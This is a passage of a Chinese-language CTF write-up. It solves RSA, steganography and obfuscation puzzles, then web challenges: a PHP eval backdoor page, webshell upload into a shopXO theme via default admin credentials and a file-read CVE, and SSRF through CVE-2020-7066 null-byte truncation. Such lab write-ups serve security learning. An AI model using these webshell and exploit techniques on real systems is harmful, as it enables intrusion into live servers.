data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># print(d)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#b'flag&#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&#125;'</span></pre></td></tr></table></figure><h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"pokémon\"><a class=\"anchor\" href=\"#pokémon\">#</a> Pokémon</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZW11bGF0b3Item9uZS5jb20vZG9jLnBocC9nYmEvdmJveWFkdmFuY2UuaHRtbA==\">Visual Boy Advance (emulator-zone.com)</span></p>\n<p>玩这个游戏，到 103 号路口就行，纯娱乐</p>\n<h3 id=\"code-obfuscation\"><a class=\"anchor\" href=\"#code-obfuscation\">#</a> code obfuscation</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041752507.png\" alt=\"image-20230404175252420\" /></p>\n<p>将图片拉伸一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041753123.png\" alt=\"image-20230404175317080\" /></p>\n<p>补一下这个图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041756324.png\" alt=\"image-20230404175641276\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041757333.png\" alt=\"image-20230404175700284\" /></p>\n<p>这里用 binwalk -e 分解后得到一个 rar</p>\n<p>将上面 gkctf 进行 base58 编码后可以打开压缩包</p>\n<p>打开后图片内容</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$Ai$An$At$Bk$Am$Aa$Ai$Bs$Bt$Cn</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$Cp</span></pre></td></tr></table></figure><p>1 文件内容</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>function<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>e<span class=\"token operator\">=</span>function<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span>c<span class=\"token operator\">&lt;</span>a<span class=\"token operator\">?</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span>e<span class=\"token punctuation\">(</span>parseInt<span class=\"token punctuation\">(</span>c<span class=\"token regex\">/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/</span><span class=\"token operator\">^</span><span class=\"token operator\">/</span><span class=\"token punctuation\">,</span>String<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>c<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>d<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>k<span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">]</span><span class=\"token operator\">||</span>e<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>k<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>function<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> d<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>e<span class=\"token operator\">=</span>function<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span><span class=\"token string\">'\\\\w+'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>c<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>c<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>p<span class=\"token operator\">=</span>p<span class=\"token operator\">.</span>replace<span class=\"token punctuation\">(</span>new RegExp<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\b'</span><span class=\"token operator\">+</span>e<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\\\b'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">'15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17=\"n\"12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17=\"n\"12 13=0 15 n 14 a b c d e f g h i j 10 11 16=\"n\"13=$((13+1))12 1g(\"1f=\\' \\';1e=\\'\"\\';16=\\'#\\';1j=\\'(\\';1i=\\')\\';1h=\\'.\\';1a=\\';\\';19=\\'&lt;\\';18=\\'>\\';1d=\\'1c\\';1b=\\'&#123;\\';1k=\\'&#125;\\';1t=\\'0\\';1u=\\'1\\';1s=\\'2\\';1r=\\'3\\';1n=\\'4\\';1m=\\'5\\';1l=\\'6\\';1q=\\'7\\';1p=\\'8\\';1o=\\'9\\';\")'</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">93</span><span class=\"token punctuation\">,</span><span class=\"token string\">'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db'</span><span class=\"token operator\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'|'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里用的是网上找到的脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ll <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'$'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>list1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Bk'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Bm'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Bn'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Bs'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Bt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'By'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Cb'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Cc'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Ce'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Cl'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Cn'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Cp'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">'Da'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Db'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Dc'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Dd'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'De'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Df'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Dg'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Dh'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Di'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Dj'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>list2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'#'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'('</span><span class=\"token punctuation\">,</span><span class=\"token string\">')'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&lt;'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'_'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&#123;'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'7'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'8'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>list3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>list4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>s <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_lowercase</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tlist3<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'A%s'</span><span class=\"token operator\">%</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tlist4<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#print(list3,'\\n',list4)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>t <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ll<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>list1<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\tt <span class=\"token operator\">+=</span> list2<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ll<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>list3<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\tt <span class=\"token operator\">+=</span>list4<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#include &lt;stdio.h>int main()&#123;print(\"w3lc0me_4o_9kct5\")return 0&#125;</span></pre></td></tr></table></figure><h3 id=\"harley-quinn\"><a class=\"anchor\" href=\"#harley-quinn\">#</a> Harley Quinn</h3>\n<p>这题放了两个 hint，看起来当时开始的时候做出来的人还是不多的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357129.png\" alt=\"image-20230404235705038\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357970.png\" alt=\"image-20230404235716937\" /></p>\n<p>音频到结尾部分，有电话音的声音，用工具 dtmf2num 进行破解：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050010205.png\" alt=\"image-20230405001023160\" /></p>\n<p>#22283334447777338866#</p>\n<p>对应 9 建</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ctfisfun</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021579.png\" alt=\"image-20230405002121528\" /></p>\n<p>根据提示使用 FreeFileCamouflage 破解</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021405.png\" alt=\"image-20230405002156367\" /></p>\n<h3 id=\"sail-a-boat-down-the-river\"><a class=\"anchor\" href=\"#sail-a-boat-down-the-river\">#</a> Sail a boat down the river</h3>\n<p>三解，三个 hint，当时的题还是很绕的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050024187.png\" alt=\"image-20230405002442142\" /></p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Hint<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>闪烁的光芒</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>是一行不是一列</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>加密方式很常见</pre></td></tr></table></figure><p>根据提示在 <code>118帧-130帧</code> 、 <code>200帧-208帧</code> 、 <code>320帧-334帧</code> 、 <code>410帧-418帧</code> 刷卡器出现闪光，摩斯密码</p>\n<pre><code>-.-- .-- ---.. --.\n</code></pre>\n<p>解出得 yw8g</p>\n<p>在 15 秒看到一张二维码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050032246.png\" alt=\"image-20230405003255656\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050035420.png\" alt=\"image-20230405003538176\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXR5Z3QwTm1fRzVmVGZWRmxneFZjclE=\">https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</span></p>\n<p>输入上面得到的密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050036502.png\" alt=\"image-20230405003637459\" /></p>\n<p>密钥解熟读，然后根据排序即可得到： <code>52693795149137</code> <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1HRzBrYy02bzZocjY4Y2xnaGs0NmgudGY=\"> 解密得到 GG0kc.tf</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050040420.png\" alt=\"image-20230405004030369\" /></p>\n<p>使用 <code>Overture</code>  打开得到 flag</p>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"checkin\"><a class=\"anchor\" href=\"#checkin\">#</a> CheckIN</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Check_In<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ClassName</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$decode</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Ginkgo'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">decode</span> <span class=\"token operator\">=</span> @<span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                @<span class=\"token keyword\">Eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">decode</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里可以看到，源码很简单，接受参数，base64 解码后 eval 执行，先尝试 phpinfo ()</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050051333.png\" alt=\"image-20230405005151284\" /></p>\n<p>能够正常执行，但是看到在环境变量中过滤了很多函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050052378.png\" alt=\"image-20230405005239337\" /></p>\n<p>没有过滤 eval 函数，尝试构造木马用蚁剑连接后，发现不能正常运行命令，使用插件绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050058842.png\" alt=\"image-20230405005812789\" /></p>\n<h3 id=\"老八小超市儿\"><a class=\"anchor\" href=\"#老八小超市儿\">#</a> 老八小超市儿</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051506808.png\" alt=\"image-20230405150623656\" /></p>\n<p>发现是 shopXO 电商系统，基于 thinkphp 开发的，去搜 CVE<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4OTg1NzgwL2FydGljbGUvZGV0YWlscy8xMjIyMTgwOTE=\"> (71 条消息) shopxo 文件读取（CNVD-2021-15822）_xzhome 的博客 - CSDN 博客</span></p>\n<p>这里直接用 poc 读取跟目录下面的 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051513091.png\" alt=\"image-20230405151307037\" /></p>\n<p>提示 flag 在 root 下面尝试读取发现 return 500 估计是权限问题，看来还得找别的 cve，看了下版本是 1.8</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051508840.png\" alt=\"image-20230405150840800\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDk5NDAw\">渗透测试 | shopxo 后台全版本获取 shell 复现 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span> 这里看到需要先登录，尝试发现没有改默认密码</p>\n<p>这里直接搜索主题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051521200.png\" alt=\"image-20230405152129091\" /></p>\n<p>下载后添加一句话木马</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051534023.png\" alt=\"image-20230405153407978\" /></p>\n<p>再上传回去</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051535230.png\" alt=\"image-20230405153555190\" /></p>\n<p>这里直接添加</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051541059.png\" alt=\"image-20230405154104996\" /></p>\n<p>用蚂蚁剑连接上后确实访问不了这个 root 目录</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230405154225020.png\" alt=\"image-20230405154225020\" /></p>\n<p>看到根目录还有一个 hint</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051543047.png\" alt=\"image-20230405154340012\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hdXRvLXBtOWZsOGZveDNoLnNo\">又看到 auto.sh</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051544829.png\" alt=\"image-20230405154429791\" /></p>\n<p>没 60 秒刷新一次，那修改一下这个脚本就可以了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051548419.png\" alt=\"image-20230405154814376\" /></p>\n<p>然后去读 flag.hint 就可以了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051549681.png\" alt=\"image-20230405154912635\" /></p>\n<h3 id=\"cve版签到\"><a class=\"anchor\" href=\"#cve版签到\">#</a> cve 版签到</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051554551.png\" alt=\"image-20230405155402510\" /></p>\n<p>cve 编号有了，看来简单复现一下就行 [<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS3kxMjI2L3AvMTQzMzIxMTAuaHRtbA==\">代码审计] CVE-2020-7066 漏洞复现 - Ky1226 - 博客园 (cnblogs.com)</span></p>\n<p>简答来说 get_headers () 会截断 URL 中空字符后的内容</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051558787.png\" alt=\"image-20230405155808748\" /></p>\n<p>点击后多了一个 url</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051557371.png\" alt=\"image-20230405155759326\" /></p>\n<p>看起来是 SSRF，通过 %00 截断然后访问本地 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608881.png\" alt=\"image-20230405160815831\" /></p>\n<p>要以 123 结尾</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608003.png\" alt=\"image-20230405160845950\" /></p>\n<h3 id=\"ez三剑客-eznode\"><a class=\"anchor\" href=\"#ez三剑客-eznode\">#</a> EZ 